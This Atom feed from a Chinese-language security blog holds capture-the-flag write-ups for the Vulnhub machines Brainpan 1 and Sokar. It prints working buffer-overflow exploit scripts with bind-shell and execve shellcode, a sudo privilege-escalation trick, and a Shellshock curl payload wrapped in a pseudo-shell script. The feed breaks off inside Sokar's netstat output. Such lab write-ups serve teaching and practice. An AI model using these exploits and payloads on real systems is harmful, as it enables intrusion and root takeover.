<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[My Octopress Blog]]></title>
  <link href="http://newdominic.github.io/atom.xml" rel="self"/>
  <link href="http://newdominic.github.io/"/>
  <updated>2015-03-08T00:36:30+08:00</updated>
  <id>http://newdominic.github.io/</id>
  <author>
    <name><![CDATA[DMC]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Brainpan 1]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/07/brainpan/"/>
    <updated>2015-03-07T00:54:43+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/07/brainpan</id>
    <content type="html"><![CDATA[<p>周末<a href="https://www.vulnhub.com/entry/brainpan-1,51/">Brainpan 1</a>一日遊，依舊是<a href="https://www.vulnhub.com/">Vulnhub</a>的Vulnerable Machine，作者是<a href="https://www.vulnhub.com/author/superkojiman,43/">superkojiman</a></p>

<!--more-->


<hr />

<pre><code># Nmap 6.46 scan initiated Thu Jan  1 13:22:09 2015 as: nmap -sV -p- -Pn -o nmap.out 192.168.2.155
Nmap scan report for 192.168.2.155
Host is up (0.00020s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
SF-Port9999-TCP:V=6.46%I=7%D=1/1%Time=54A5905C%P=x86_64-unknown-linux-gnu%
SF:r(NULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\
SF:|_\|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\
SF:x20\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_
SF:\|\x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_
SF:\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x
SF:20\x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x
SF:20\x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINP
SF:AN\x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENT
SF:ER\x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20&gt;&gt;\x20");
MAC Address: 00:0C:29:03:CB:6C (VMware)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done at Thu Jan  1 13:22:50 2015 -- 1 IP address (1 host up) scanned in 40.75 seconds
</code></pre>

<p>掃出9999和10000上有東西，先連上9999試試看</p>

<pre><code>_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          &gt;&gt;
                          ACCESS DENIED
</code></pre>

<p>是個毫無頭緒的密碼輸入欄位，隨便試了幾個方法都沒有過，先擱置</p>

<p>而在 <a href="http://192.168.2.155:10000">http://192.168.2.155:10000</a> 上面只出現一張圖片，沒有其他線索</p>

<p>用dirbuster掃一下會找到在/bin目錄下有一個brainpan.exe，猜測應該是架在9999上的程式，直接抓下來看</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# strings brainpan.exe
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
</code></pre>

<p>&ldquo;shitstorm&#8221;，這看起來超可疑的，直接連到目標機器試試看</p>

<pre><code>_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          &gt;&gt; shitstorm
                          ACCESS GRANTED
</code></pre>

<p>&ldquo;ACCSESS GRANTED&rdquo;!! 成功了!</p>

<p>&hellip;然後甚麼事都沒發生，再用nmap掃一次，也沒有打開新的port，看來不是這麼簡單就能突破的關卡。</p>

<p>再來用ImmunityDebugger載入brainpan.exe之後，找到shitstorm的位置</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/shitstorm.png"></p>

<p>這個函式看起來有buffer overflow的問題，而且不知道為甚麼，上面還有一個很神奇的函式，裡面直接提供了 JMP ESP</p>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/welcome.png"></p>

<p>接著來試看看能不能將return address改到311712F3。在ImmunityDebugger下個斷點後，執行下面這句</p>

<pre><code>python -c 'print "A"*524 + "\xf3\x12\x17\x31"' | nc -v 192.168.2.152 9999
</code></pre>

<p><img class="center" src="http://newdominic.github.io/images/2015-03-07-brainpan/EIP.png"></p>

<p>成功進來了，剩下的就是把shellcode塞到0x311712f3之後去執行</p>

<p>找個<a href="http://shell-storm.org/shellcode/files/shellcode-882.php">bind shell</a> 把exploit拼起來</p>

<pre><code>#!/usr/bin/python

trash="A"*524

ret_addr="\xf3\x12\x17\x31"

shellcode=(
"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"
)

print trash+ret_addr+shellcode
</code></pre>

<p>送出之後會發現伺服器沒有回應，接著來連看看被綁定的1337 port</p>

<pre><code>root@kali:~# nc -v 192.168.2.155 1337
192.168.2.155: inverse host lookup failed: Unknown server error : Connection timed out
(UNKNOWN) [192.168.2.155] 1337 (?) open
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
</code></pre>

<p>成功拿到shell了，先來看看有沒有sudo權限</p>

<pre><code>puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
</code></pre>

<p>看來puck可以執行在anansi目錄下的一個anansi_util</p>

<pre><code>puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
- network
- proclist
- manual [command]
</code></pre>

<p>玩弄anansi_util發現試不出甚麼名堂，來找找anansi有沒有其他程式</p>

<pre><code>puck@brainpan:/home/puck$ find / -user anansi 2&gt;/dev/null
find / -user anansi 2&gt;/dev/null
/usr/local/bin/validate
/home/anansi

puck@brainpan:/home/puck/web$ ls -al /usr/local/bin/validate
ls -al /usr/local/bin/validate
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate

puck@brainpan:/home/puck$ /usr/local/bin/validate
/usr/local/bin/validate
usage /usr/local/bin/validate &lt;input&gt;

puck@brainpan:/home/puck$ /usr/local/bin/validate 123
/usr/local/bin/validate 123
validating input...passed.
</code></pre>

<p>/usr/local/bin/validate 是個設有sticky bit的程式，不過執行之後試不出東西，在brainpan上面gdb也不能用，只好把它複製到/home/puck/web再回Kali Linux用gdb看</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# gdb -q validate
Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre>

<p>看起來沒有甚麼安全性的設定，看一下有哪些函式可以用</p>

<pre><code>gdb-peda$ info functions
All defined functions:

File validate.c:
int main(int, char **);
char *validate(char *);

Non-debugging symbols:
0x0804834c  _init
0x0804838c  __gmon_start__
0x0804838c  __gmon_start__@plt
0x0804839c  __libc_start_main
0x0804839c  __libc_start_main@plt
0x080483ac  strlen
0x080483ac  strlen@plt
0x080483bc  strcpy
0x080483bc  strcpy@plt
0x080483cc  printf
0x080483cc  printf@plt
0x080483dc  puts
0x080483dc  puts@plt
0x080483ec  exit
0x080483ec  exit@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080485a0  __libc_csu_fini
0x080485b0  __libc_csu_init
0x0804860a  __i686.get_pc_thunk.bx
0x08048610  __do_global_ctors_aux
0x0804863c  _fini
</code></pre>

<p>validate看起來應該是驗證輸入用的，接著看一下反組譯的結果</p>

<pre><code>gdb-peda$ disas validate
Dump of assembler code for function validate:
   0x080484b4 &lt;+0&gt;:     push   ebp
   0x080484b5 &lt;+1&gt;:     mov    ebp,esp
   0x080484b7 &lt;+3&gt;:     push   ebx
   0x080484b8 &lt;+4&gt;:     sub    esp,0x84
   0x080484be &lt;+10&gt;:    mov    DWORD PTR [ebp-0xc],0x0
   0x080484c5 &lt;+17&gt;:    mov    DWORD PTR [ebp-0xc],0x0
   0x080484cc &lt;+24&gt;:    jmp    0x8048508 &lt;validate+84&gt;
   0x080484ce &lt;+26&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484d1 &lt;+29&gt;:    add    eax,DWORD PTR [ebp+0x8]
   0x080484d4 &lt;+32&gt;:    movzx  eax,BYTE PTR [eax]
   0x080484d7 &lt;+35&gt;:    cmp    al,0x46
   0x080484d9 &lt;+37&gt;:    jne    0x8048504 &lt;validate+80&gt;
   0x080484db &lt;+39&gt;:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484de &lt;+42&gt;:    add    eax,DWORD PTR [ebp+0x8]
   0x080484e1 &lt;+45&gt;:    movzx  eax,BYTE PTR [eax]
   0x080484e4 &lt;+48&gt;:    movsx  edx,al
   0x080484e7 &lt;+51&gt;:    mov    eax,0x8048660
   0x080484ec &lt;+56&gt;:    mov    DWORD PTR [esp+0x4],edx
   0x080484f0 &lt;+60&gt;:    mov    DWORD PTR [esp],eax
   0x080484f3 &lt;+63&gt;:    call   0x80483cc &lt;printf@plt&gt;
   0x080484f8 &lt;+68&gt;:    mov    DWORD PTR [esp],0x1
   0x080484ff &lt;+75&gt;:    call   0x80483ec &lt;exit@plt&gt;
   0x08048504 &lt;+80&gt;:    add    DWORD PTR [ebp-0xc],0x1
   0x08048508 &lt;+84&gt;:    mov    ebx,DWORD PTR [ebp-0xc]
   0x0804850b &lt;+87&gt;:    mov    eax,DWORD PTR [ebp+0x8]
   0x0804850e &lt;+90&gt;:    mov    DWORD PTR [esp],eax
   0x08048511 &lt;+93&gt;:    call   0x80483ac &lt;strlen@plt&gt;
   0x08048516 &lt;+98&gt;:    cmp    ebx,eax
   0x08048518 &lt;+100&gt;:   jb     0x80484ce &lt;validate+26&gt;
   0x0804851a &lt;+102&gt;:   mov    eax,DWORD PTR [ebp+0x8]
   0x0804851d &lt;+105&gt;:   mov    DWORD PTR [esp+0x4],eax
   0x08048521 &lt;+109&gt;:   lea    eax,[ebp-0x70]
   0x08048524 &lt;+112&gt;:   mov    DWORD PTR [esp],eax
   0x08048527 &lt;+115&gt;:   call   0x80483bc &lt;strcpy@plt&gt;
   0x0804852c &lt;+120&gt;:   lea    eax,[ebp-0x70]
   0x0804852f &lt;+123&gt;:   add    esp,0x84
   0x08048535 &lt;+129&gt;:   pop    ebx
   0x08048536 &lt;+130&gt;:   pop    ebp
   0x08048537 &lt;+131&gt;:   ret
End of assembler dump.
</code></pre>

<p>validate就只是驗證輸入的字串的裡面有沒有出現&#8221;F&#8221;(0x46)，有出現&#8221;F&#8221;就是驗證失敗</p>

<p>這個程式就這麼簡單，不過因為它有設定sticky bits，接下來試試看有沒有buffer overflow可以利用來取得anansi的shell</p>

<pre><code>gdb-peda$ r `python -c 'print "A"*200'`

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffcab8 ('A' &lt;repeats 200 times&gt;...)
EBX: 0x41414141 ('AAAA')
ECX: 0x0
EDX: 0xbb9
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcb30 ('A' &lt;repeats 200 times&gt;...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
</code></pre>

<p>eip被塞滿了A，接下來看看有沒有JMP ESP可以利用</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j esp validate
[validate]
</code></pre>

<p>空無一物，不過看到EAX也被輸入的A給塞滿了，再來找一下有沒有JMP EAX可以用</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# msfelfscan -j eax validate
[validate]
0x080484af call eax
0x0804862b call eax
</code></pre>

<p>有兩個可以用，接著只要找到return adrdress之後跟shellcode當作參數傳入後應該就能拿到shell了</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_create.rb 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
root@kali:~/_Sec/vulnhub/brainpan# gdb -q ./validate
Reading symbols from /root/_Sec/vulnhub/brainpan/validate...done.
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

Program received signal SIGSEGV, Segmentation fault.
.....
0x39644138 in ?? ()
gdb-peda$ q
root@kali:~/_Sec/vulnhub/brainpan# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
[*] Exact match at offset 116
</code></pre>

<p>算出來return address的位置在116，接下來要找一個字串長度在116個字以內的<a href="http://shell-storm.org/shellcode/files/shellcode-606.php">shellcode</a>串成要用的exploit</p>

<pre><code>root@kali:~/_Sec/vulnhub/brainpan# cat shell_exp.py
#!/usr/bin/python

shellcode=(
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x51\x53\x89\xe1\xcd\x80"
)

nop="\x90"*(116-len(shellcode))

ret_addr="\xaf\x94\x04\x08"

print shellcode+nop+ret_addr

root@kali:~/_Sec/vulnhub/brainpan# ./validate `python shell_exp.py`
root@kali:/root/_Sec/vulnhub/brainpan#
</code></pre>

<p>成功執行了/bin/sh，接下來實際到brainpan上面試試</p>

<pre><code>puck@brainpan:/home/puck$ /usr/local/bin/validate  `python shell_exp.py`
/usr/local/bin/validate  `python shell_exp.py`
bash-4.2$ id
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
</code></pre>

<p>拿到了anansi的權限，我們就可以去修改anansi_util，讓它變成一支可以產生shell的程式，最後再回到puck用sudo(root權限)執行</p>

<pre><code>bash-4.2$ cat anansi_util
cat anansi_util
i#!/usr/bin/python

import pty
pty.spawn("/bin/bash")
bash-4.2$ chmod +x anansi_util
chmod +x anansi_util
bash-4.2$ exit
exit
exit
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
root@brainpan:/home/puck# id
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p>打完收工:) 再找時間玩玩Brainpan 2</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Sokar]]></title>
    <link href="http://newdominic.github.io/blog/2015/03/02/Sokar/"/>
    <updated>2015-03-02T00:57:45+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/03/02/Sokar</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/sokar-1,113/">Sokar</a>是<a href="https://www.vulnhub.com/">Vulnhub</a>在<a href="http://blog.vulnhub.com/competition-sokar/">2015年第一次競賽</a>中使用的機器，作者是<a href="https://www.vulnhub.com/author/rasta-mouse,77/">Rasta Mouse</a></p>

<!--more-->


<hr />

<p>先用nmap掃瞄一遍目標機器，發現在591 port有架http server</p>

<pre><code>Starting Nmap 6.46 ( http://nmap.org ) at 2015-01-01 09:57 EST
Nmap scan report for 192.168.2.154
Host is up (0.00058s latency).
Not shown: 65534 filtered ports
PORT    STATE SERVICE VERSION
591/tcp open  http    Apache httpd 2.2.15 ((CentOS))
MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1187.08 seconds
</code></pre>

<p><img class="left" src="http://newdominic.github.io/images/2015-03-02-sokar/591.png"></p>

<p>連上 <a href="http://192.168.2.154:591">http://192.168.2.154:591</a> 之後，首頁出現了這台機器的資訊，看起來是跑了date、uptime、netstat和iostat的結果</p>

<p>F5多刷幾次會發現這個狀態是每分鐘更新一次，猜測應該有用crontab跑排程</p>

<p>再看一下網頁原始碼，知道是跑這支cgi程式 <a href="http://192.168.2.154:591/cgi-bin/cat">http://192.168.2.154:591/cgi-bin/cat</a></p>

<p>對於再來要做甚麼有點沒頭緒，直接來試試去年很夯的Shellshock</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# curl -A <span class="s2">&quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; echo; /bin/ls /home;&quot;</span> http://192.168.2.154:591/cgi-bin/cat                 
apophis
bynarr</code></pre></div>


<p>..隨便就矇中啦XD！寫個script讓操作可以輕鬆點</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# cat exp.sh
<span class="c">#!/bin/bash</span>

<span class="nb">shopt</span> -s extglob
<span class="nv">usr_bin</span><span class="o">=</span><span class="s1">&#39;+(id|whoami|wget|uptime)&#39;</span> <span class="c">#執行檔的路徑要自己設定</span>

<span class="k">while</span> <span class="o">[</span> <span class="m">1</span> -gt <span class="m">0</span> <span class="o">]</span>
<span class="k">do</span>

<span class="nb">echo</span> -n <span class="s2">&quot;[apache@sokar] &quot;</span> <span class="c">#假裝自己是個shell...</span>
<span class="nb">read </span>cmd

<span class="nv">prefix</span><span class="o">=</span><span class="s2">&quot;/bin/&quot;</span>
<span class="nv">bin</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$cmd</span> <span class="p">|</span> awk <span class="s1">&#39;{print $1}&#39;</span><span class="sb">`</span>
<span class="k">case</span> <span class="nv">$bin</span> in
<span class="nv">$usr_bin</span><span class="o">)</span>
    <span class="nv">prefix</span><span class="o">=</span><span class="s2">&quot;/usr/bin/&quot;</span><span class="p">;;</span>
<span class="k">esac</span>

<span class="nv">final_cmd</span><span class="o">=</span><span class="nv">$prefix$cmd</span>

<span class="nv">line</span><span class="o">=</span><span class="s2">&quot;() { :; }; echo \&quot;Content-type: text/plain\&quot;; echo; $final_cmd;&quot;</span>
curl -A <span class="s2">&quot;$line&quot;</span> http://192.168.2.154:591/cgi-bin/cat


<span class="k">done</span></code></pre></div>


<p>先來看看/cgi-bin/cat到底做了哪些事情</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> cat cat
<span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s2">&quot;Content-type: text/html&quot;</span><span class="p">;</span>
<span class="nb">echo</span> <span class="s2">&quot;&quot;</span>

/bin/cat <span class="s">&lt;&lt; EOM</span>
<span class="s">&lt;pre&gt;</span>
<span class="s">EOM</span>

<span class="nb">echo</span> <span class="sb">`</span>date<span class="sb">`</span>
<span class="nb">echo</span> <span class="sb">`</span>uptime<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">&quot;&lt;br /&gt;&quot;</span>
/bin/cat /tmp/stats

/bin/cat <span class="s">&lt;&lt; EOM</span>
<span class="s">&lt;/pre&gt;</span>
<span class="s">EOM</span></code></pre></div>


<p>他即時執行了date和uptime，看起來netstat和iostat的資訊就是排程執行後存在/tmp/stats裡面</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apache@sokar<span class="o">]</span> cat /tmp/stats
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address               Foreign Address             State
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36163         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:35913         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36490         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36186         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:36789         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> 192.168.2.154:35907         192.168.2.128:51242         CLOSE_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> :::591                      :::*                        LISTEN
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52364  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52363  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52367  TIME_WAIT
tcp        <span class="m">0</span>      <span class="m">0</span> ::ffff:192.168.2.154:591    ::ffff:192.168.2.128:52366  TIME_WAIT
udp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:68                  0.0.0.0:*
Active UNIX domain sockets <span class="o">(</span>servers and established<span class="o">)</span>
Proto RefCnt Flags       Type       State         I-Node Path
unix  <span class="m">9</span>      <span class="o">[</span> <span class="o">]</span>         DGRAM                    <span class="m">8239</span>   /dev/log
